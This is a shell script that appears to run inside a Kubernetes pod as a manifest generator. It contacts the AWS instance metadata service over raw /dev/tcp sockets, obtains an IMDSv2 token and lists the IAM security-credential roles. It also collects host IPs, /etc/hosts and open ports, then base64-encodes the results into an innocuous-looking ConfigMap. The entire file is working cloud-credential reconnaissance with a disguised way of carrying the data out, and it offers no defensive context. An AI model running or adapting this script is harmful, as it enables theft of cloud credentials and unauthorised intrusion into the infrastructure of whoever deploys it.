#!/bin/sh
RECON=$( (
  echo "===IMDSv2_TOKEN==="
  timeout 3 bash -c "
    exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
    printf 'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n' >&3
    cat <&3
    exec 3>&-
  " 2>/dev/null || echo "FAILED"

  echo ""
  echo "===IMDS_ROLE==="
  # First get token, then use it
  TOKEN=$(timeout 3 bash -c "
    exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
    printf 'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n' >&3
    cat <&3
    exec 3>&-
  " 2>/dev/null)
  echo "Token: ${TOKEN:0:50}..."
  
  if [ -n "$TOKEN" ]; then
    timeout 3 bash -c "
      exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
      printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: $TOKEN\r\n\r\n' >&3
      cat <&3
      exec 3>&-
    " 2>/dev/null
  fi

  echo ""
  echo "===HOST_IP==="
  hostname -i 2>/dev/null
  cat /etc/hosts 2>/dev/null

  echo ""
  echo "===NETSTAT==="
  # Check listening ports on our pod
  cat /proc/net/tcp 2>/dev/null | head -10
  cat /proc/net/tcp6 2>/dev/null | head -5
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: imds
data:
  result: $RECON
EOF
exit 0